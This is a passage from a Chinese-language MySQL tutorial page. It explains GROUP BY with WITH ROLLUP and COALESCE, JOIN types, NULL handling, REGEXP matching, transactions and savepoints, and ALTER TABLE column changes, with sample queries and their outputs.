<span class="keyword">NULL</span>,  `name` <span class="type">char</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span>,  `<span class="type">date</span>` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span>,  `singin` tinyint(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;登录次数&#x27;</span>,  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">--  Records of `employee_tbl`</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `employee_tbl` <span class="keyword">VALUES</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;2016-04-22 15:25:33&#x27;</span>, <span class="string">&#x27;1&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;小王&#x27;</span>, <span class="string">&#x27;2016-04-20 15:25:47&#x27;</span>, <span class="string">&#x27;3&#x27;</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;小丽&#x27;</span>, <span class="string">&#x27;2016-04-19 15:26:02&#x27;</span>, <span class="string">&#x27;2&#x27;</span>), (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;小王&#x27;</span>, <span class="string">&#x27;2016-04-07 15:26:14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>), (<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;2016-04-11 15:26:40&#x27;</span>, <span class="string">&#x27;4&#x27;</span>), (<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;2016-04-04 15:26:54&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>导入成功后, 执行以下 SQL 语句:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> names utf8;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------------------+--------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name   <span class="operator">|</span> <span class="type">date</span>                <span class="operator">|</span> singin <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------------------+--------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> 小明 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-22</span> <span class="number">15</span>:<span class="number">25</span>:<span class="number">33</span> <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> 小王 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-20</span> <span class="number">15</span>:<span class="number">25</span>:<span class="number">47</span> <span class="operator">|</span>      <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> 小丽 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-19</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">02</span> <span class="operator">|</span>      <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> 小王 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-07</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">14</span> <span class="operator">|</span>      <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> 小明 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-11</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">40</span> <span class="operator">|</span>      <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> 小明 <span class="operator">|</span> <span class="number">2016</span><span class="number">-04</span><span class="number">-04</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">54</span> <span class="operator">|</span>      <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------------------+--------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>接下来我们使用 GROUP BY 语句 将数据表按名字进行分组, 并统计每个人有多少条记录:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span>   employee_tbl <span class="keyword">GROUP</span> <span class="keyword">BY</span> name;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+----------+</span></span><br><span class="line"><span class="operator">|</span> name   <span class="operator">|</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+----------+</span></span><br><span class="line"><span class="operator">|</span> 小丽 <span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>        <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><h3 id="使用-WITH-ROLLUP"><a href="#使用-WITH-ROLLUP" class="headerlink" title="使用 WITH ROLLUP"></a>使用 WITH ROLLUP</h3><p>WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM, AVG, COUNT…）。</p><p>例如我们将以上的数据表按名字进行分组, 再统计每个人登录的次数:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name, <span class="built_in">SUM</span>(singin) <span class="keyword">as</span> singin_count <span class="keyword">FROM</span>  employee_tbl <span class="keyword">GROUP</span> <span class="keyword">BY</span> name <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------+</span></span><br><span class="line"><span class="operator">|</span> name   <span class="operator">|</span> singin_count <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------+</span></span><br><span class="line"><span class="operator">|</span> 小丽 <span class="operator">|</span>            <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明 <span class="operator">|</span>            <span class="number">7</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王 <span class="operator">|</span>            <span class="number">7</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span>           <span class="number">16</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>其中记录 NULL 表示所有人的登录次数。</p><p>我们可以使用 coalesce 来设置一个可以取代 NUll 的名称, coalesce 语法:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">coalesce</span>(a, b, c);</span><br></pre></td></tr></table></figure><p>参数说明:如果a==null, 则选择b；如果b==null, 则选择c；如果a!=null, 则选择a；如果a b c 都为null , 则返回为null（没意义）。</p><p>以下实例中如果名字为空我们使用总数代替:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">coalesce</span>(name, <span class="string">&#x27;总数&#x27;</span>), <span class="built_in">SUM</span>(singin) <span class="keyword">as</span> singin_count <span class="keyword">FROM</span>  employee_tbl <span class="keyword">GROUP</span> <span class="keyword">BY</span> name <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">coalesce</span>(name, <span class="string">&#x27;总数&#x27;</span>) <span class="operator">|</span> singin_count <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> 小丽                   <span class="operator">|</span>            <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小明                   <span class="operator">|</span>            <span class="number">7</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 小王                   <span class="operator">|</span>            <span class="number">7</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 总数                   <span class="operator">|</span>           <span class="number">16</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+--------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><h2 id="连接的使用"><a href="#连接的使用" class="headerlink" title="连接的使用"></a>连接的使用</h2><p>在前几章节中, 我们已经学会了如何在一张表中读取数据, 这是相对简单的, 但是在真正的应用中经常需要从多个数据表中读取数据。</p><p>本章节我们将向大家介绍如何使用 MySQL 的 JOIN 在两个或多个表中查询数据。</p><p>你可以在 SELECT, UPDATE 和 DELETE 语句中使用 Mysql 的 JOIN 来联合多表查询。</p><p>JOIN 按照功能大致分为如下三类:</p><ul><li><strong>INNER JOIN（内连接, 或等值连接）</strong>:获取两个表中字段匹配关系的记录。</li><li>**LEFT JOIN（左连接）:**获取左表所有记录, 即使右表没有对应匹配的记录。</li><li><strong>RIGHT JOIN（右连接）:</strong> 与 LEFT JOIN 相反, 用于获取右表所有记录, 即使左表没有对应匹配的记录。</li></ul><h2 id="NULL-值处理"><a href="#NULL-值处理" class="headerlink" title="NULL 值处理"></a>NULL 值处理</h2><p>我们已经知道 MySQL 使用 SQL SELECT 命令及 WHERE 子句来读取数据表中的数据, 但是当提供的查询条件字段为 NULL 时, 该命令可能就无法正常工作。</p><p>为了处理这种情况, MySQL提供了三大运算符:</p><ul><li><strong>IS NULL:</strong> 当列的值是 NULL, 此运算符返回 true。</li><li><strong>IS NOT NULL:</strong> 当列的值不为 NULL, 运算符返回 true。</li><li><strong>&lt;=&gt;:</strong> 比较操作符（不同于=运算符）, 当比较的的两个值为 NULL 时返回 true。</li></ul><p>关于 NULL 的条件比较运算是比较特殊的。你不能使用 = NULL 或 != NULL 在列中查找 NULL 值 。</p><p>在 MySQL 中, NULL 值与任何其它值的比较（即使是 NULL）永远返回 false, 即 NULL = NULL 返回false 。</p><p>MySQL 中处理 NULL 使用 IS NULL 和 IS NOT NULL 运算符。</p><blockquote><p><strong>注意:</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> , columnName1<span class="operator">+</span>ifnull(columnName2, <span class="number">0</span>) <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure><p>columnName1, columnName2 为 int 型, 当 columnName2 中, 有值为 null 时, columnName1+columnName2=null, ifnull(columnName2, 0) 把 columnName2 中 null 值转为 0。</p></blockquote><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>在前面的章节我们已经了解到MySQL可以通过 <strong>LIKE …%</strong> 来进行模糊匹配。</p><p>MySQL 同样也支持其他正则表达式的匹配, MySQL中使用 REGEXP 操作符来进行正则表达式匹配。</p><p>如果您了解PHP或Perl, 那么操作起来就非常简单, 因为MySQL的正则表达式匹配与这些脚本的类似。</p><p>下表中的正则模式可应用于 REGEXP 操作符中。</p><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性, ^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td></tr><tr><td align="left">$</td><td align="left">匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性, $ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td></tr><tr><td align="left">.</td><td align="left">匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符, 请使用象 ‘[.\n]’ 的模式。</td></tr><tr><td align="left">[…]</td><td align="left">字符集合。匹配所包含的任意一个字符。例如, ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td></tr><tr><td align="left">[^…]</td><td align="left">负值字符集合。匹配未包含的任意字符。例如, ‘[^abc]’ 可以匹配 “plain” 中的’p’。</td></tr><tr><td align="left">p1|p2|p3</td><td align="left">匹配 p1 或 p2 或 p3。例如, ‘z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</td></tr><tr><td align="left">*</td><td align="left">匹配前面的子表达式零次或多次。例如, zo* 能匹配 “z” 以及 “zoo”。* 等价于{0, }。</td></tr><tr><td align="left">+</td><td align="left">匹配前面的子表达式一次或多次。例如, ‘zo+’ 能匹配 “zo” 以及 “zoo”, 但不能匹配 “z”。+ 等价于 {1, }。</td></tr><tr><td align="left">{n}</td><td align="left">n 是一个非负整数。匹配确定的 n 次。例如, ‘o{2}’ 不能匹配 “Bob” 中的 ‘o’, 但是能匹配 “food” 中的两个 o。</td></tr><tr><td align="left">{n, m}</td><td align="left">m 和 n 均为非负整数, 其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</td></tr></tbody></table><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>了解以上的正则需求后, 我们就可以根据自己的需求来编写带有正则表达式的SQL语句。以下我们将列出几个小实例(表名:person_tbl )来加深我们的理解:</p><p>查找name字段中以’st’为开头的所有数据:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name <span class="keyword">FROM</span> person_tbl <span class="keyword">WHERE</span> name REGEXP <span class="string">&#x27;^st&#x27;</span>;</span><br></pre></td></tr></table></figure><p>查找name字段中以’ok’为结尾的所有数据:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name <span class="keyword">FROM</span> person_tbl <span class="keyword">WHERE</span> name REGEXP <span class="string">&#x27;ok$&#x27;</span>;</span><br></pre></td></tr></table></figure><p>查找name字段中包含’mar’字符串的所有数据:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name <span class="keyword">FROM</span> person_tbl <span class="keyword">WHERE</span> name REGEXP <span class="string">&#x27;mar&#x27;</span>;</span><br></pre></td></tr></table></figure><p>查找name字段中以元音字符开头或以’ok’字符串结尾的所有数据:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> name <span class="keyword">FROM</span> person_tbl <span class="keyword">WHERE</span> name REGEXP <span class="string">&#x27;^[aeiou]|ok$&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>MySQL 事务主要用于处理操作量大, 复杂度高的数据。比如说, 在人员管理系统中, 你删除一个人员, 你即需要删除人员的基本资料, 也要删除和该人员相关的信息, 如信箱, 文章等等, 这样, 这些数据库操作语句就构成一个事务！</p><ul><li>在 MySQL 中只有使用了 Innodb 数据库引擎的数据库或表才支持事务。</li><li>事务处理可以用来维护数据库的完整性, 保证成批的 SQL 语句要么全部执行, 要么全部不执行。</li><li>事务用来管理 insert, update, delete 语句</li></ul><p>一般来说, 事务是必须满足4个条件（ACID）::原子性（<strong>A</strong>tomicity, 或称不可分割性）、一致性（<strong>C</strong>onsistency）、隔离性（<strong>I</strong>solation, 又称独立性）、持久性（<strong>D</strong>urability）。</p><ul><li>**原子性:**一个事务（transaction）中的所有操作, 要么全部完成, 要么全部不完成, 不会结束在中间某个环节。事务在执行过程中发生错误, 会被回滚（Rollback）到事务开始前的状态, 就像这个事务从来没有执行过一样。</li><li>**一致性:**在事务开始之前和事务结束以后, 数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则, 这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。</li><li>**隔离性:**数据库允许多个并发事务同时对其数据进行读写和修改的能力, 隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别, 包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。</li><li>**持久性:**事务处理结束后, 对数据的修改就是永久的, 即便系统故障也不会丢失。</li></ul><blockquote><p>在 MySQL 命令行的默认设置下, 事务都是自动提交的, 即执行 SQL 语句后就会马上执行 COMMIT 操作。因此要显式地开启一个事务务须使用命令 BEGIN 或 START TRANSACTION, 或者执行命令 SET AUTOCOMMIT=0, 用来禁止使用当前会话的自动提交。</p></blockquote><h3 id="事务控制语句"><a href="#事务控制语句" class="headerlink" title="事务控制语句"></a>事务控制语句</h3><ul><li>BEGIN 或 START TRANSACTION 显式地开启一个事务；</li><li>COMMIT 也可以使用 COMMIT WORK, 不过二者是等价的。COMMIT 会提交事务, 并使已对数据库进行的所有修改成为永久性的；</li><li>ROLLBACK 也可以使用 ROLLBACK WORK, 不过二者是等价的。回滚会结束用户的事务, 并撤销正在进行的所有未提交的修改；</li><li>SAVEPOINT identifier, SAVEPOINT 允许在事务中创建一个保存点, 一个事务中可以有多个 SAVEPOINT；</li><li>RELEASE SAVEPOINT identifier 删除一个事务的保存点, 当没有指定的保存点时, 执行该语句会抛出一个异常；</li><li>ROLLBACK TO identifier 把事务回滚到标记点；</li><li>SET TRANSACTION 用来设置事务的隔离级别。InnoDB 存储引擎提供事务的隔离级别有READ UNCOMMITTED、READ COMMITTED、REPEATABLE READ 和 SERIALIZABLE。</li></ul><h3 id="MYSQL-事务处理主要有两种方法"><a href="#MYSQL-事务处理主要有两种方法" class="headerlink" title="MYSQL 事务处理主要有两种方法"></a>MYSQL 事务处理主要有两种方法</h3><p>1、用 BEGIN, ROLLBACK, COMMIT来实现</p><ul><li><strong>BEGIN</strong> 开始一个事务</li><li><strong>ROLLBACK</strong> 事务回滚</li><li><strong>COMMIT</strong> 事务确认</li></ul><p>2、直接用 SET 来改变 MySQL 的自动提交模式:</p><ul><li><strong>SET AUTOCOMMIT=0</strong> 禁止自动提交</li><li><strong>SET AUTOCOMMIT=1</strong> 开启自动提交</li></ul><h2 id="使用保留点-SAVEPOINT"><a href="#使用保留点-SAVEPOINT" class="headerlink" title="使用保留点 SAVEPOINT"></a><strong>使用保留点 SAVEPOINT</strong></h2><p>savepoint 是在数据库事务处理中实现“子事务”（subtransaction）, 也称为嵌套事务的方法。事务可以回滚到 savepoint 而不影响 savepoint 创建前的变化, 不需要放弃整个事务。</p><p>ROLLBACK 回滚的用法可以设置保留点 SAVEPOINT, 执行多条操作时, 回滚到想要的那条语句之前。</p><p>使用 SAVEPOINT</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SAVEPOINT</span> savepoint_name;    <span class="operator">/</span><span class="operator">/</span> 声明一个 <span class="keyword">savepoint</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> savepoint_name;  <span class="operator">/</span><span class="operator">/</span> 回滚到<span class="keyword">savepoint</span></span><br></pre></td></tr></table></figure><p>删除 SAVEPOINT</p><p>保留点再事务处理完成（执行一条 ROLLBACK 或 COMMIT）后自动释放。</p><p>MySQL5 以来, 可以用:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RELEASE</span> <span class="keyword">SAVEPOINT</span> savepoint_name;  <span class="operator">/</span><span class="operator">/</span> 删除指定保留点</span><br></pre></td></tr></table></figure><h2 id="ALTER命令"><a href="#ALTER命令" class="headerlink" title="ALTER命令"></a>ALTER命令</h2><p>当我们需要修改数据表名或者修改数据表字段时, 就需要使用到MySQL ALTER命令。</p><p>开始本章教程前让我们先创建一张表, 表名为:testalter_tbl。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@host</span># mysql <span class="operator">-</span>u root <span class="operator">-</span>p password;</span><br><span class="line">Enter password:<span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">mysql<span class="operator">&gt;</span> use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> testalter_tbl</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> (</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> i <span class="type">INT</span>,    <span class="operator">-</span><span class="operator">&gt;</span> c <span class="type">CHAR</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> );</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.05</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> testalter_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field <span class="operator">|</span> Type    <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> i     <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> c     <span class="operator">|</span> <span class="type">char</span>(<span class="number">1</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><hr><h2 id="删除-添加或修改表字段"><a href="#删除-添加或修改表字段" class="headerlink" title="删除, 添加或修改表字段"></a>删除, 添加或修改表字段</h2><p>如下命令使用了 ALTER 命令及 DROP 子句来删除以上创建表的 i 字段:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl  <span class="keyword">DROP</span> i;</span><br></pre></td></tr></table></figure><p>如果数据表中只剩余一个字段则无法使用DROP来删除字段。</p><p>MySQL 中使用 ADD 子句来向数据表中添加列, 如下实例在表 testalter_tbl 中添加 i 字段, 并定义数据类型:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">ADD</span> i <span class="type">INT</span>;</span><br></pre></td></tr></table></figure><p>执行以上命令后, i 字段会自动添加到数据表字段的末尾。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> testalter_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field <span class="operator">|</span> Type    <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> c     <span class="operator">|</span> <span class="type">char</span>(<span class="number">1</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> i     <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>如果你需要指定新增字段的位置, 可以使用MySQL提供的关键字 FIRST (设定位第一列), AFTER 字段名（设定位于某个字段之后）。</p><p>尝试以下 ALTER TABLE 语句, 在执行成功后, 使用 SHOW COLUMNS 查看表结构的变化:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">DROP</span> i;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">ADD</span> i <span class="type">INT</span> <span class="keyword">FIRST</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">DROP</span> i;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">ADD</span> i <span class="type">INT</span> AFTER c;</span><br></pre></td></tr></table></figure><p>FIRST 和 AFTER 关键字可用于 ADD 与 MODIFY 子句, 所以如果你想重置数据表字段的位置就需要先使用 DROP 删除字段然后使用 ADD 来添加字段并设置位置。</p><hr><h2 id="修改字段类型及名称"><a href="#修改字段类型及名称" class="headerlink" title="修改字段类型及名称"></a>修改字段类型及名称</h2><p>如果需要修改字段类型及名称, 你可以在ALTER命令中使用 MODIFY 或 CHANGE 子句 。</p><p>例如, 把字段 c 的类型从 CHAR(1) 改为 CHAR(10), 可以执行以下命令:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl MODIFY c <span class="type">CHAR</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><p>使用 CHANGE 子句, 语法有很大的不同。 在 CHANGE 关键字之后, 紧跟着的是你要修改的字段名, 然后指定新字段名及类型。尝试如下实例:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl CHANGE i j <span class="type">BIGINT</span>;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl CHANGE j j <span class="type">INT</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="ALTER-TABLE-对-Null-值和默认值的影响"><a href="#ALTER-TABLE-对-Null-值和默认值的影响" class="headerlink" title="ALTER TABLE 对 Null 值和默认值的影响"></a>ALTER TABLE 对 Null 值和默认值的影响</h2><p>当你修改字段时, 你可以指定是否包含值或者是否设置默认值。</p><p>以下实例, 指定字段 j 为 NOT NULL 且默认值为100 。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> MODIFY j <span class="type">BIGINT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>如果你不设置默认值, MySQL会自动设置该字段默认为 NULL。</p><hr><h2 id="修改字段默认值"><a href="#修改字段默认值" class="headerlink" title="修改字段默认值"></a>修改字段默认值</h2><p>你可以使用 ALTER 来修改字段的默认值, 尝试以下实例:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> testalter_tbl <span class="keyword">ALTER</span> i <span class="keyword">SET</span> <span class="keyword">DEFAULT</span> <span class="number">1000</span>;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> testalter_tbl;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+------+-----+---------+-------+</span></span><br><span class="line"><span 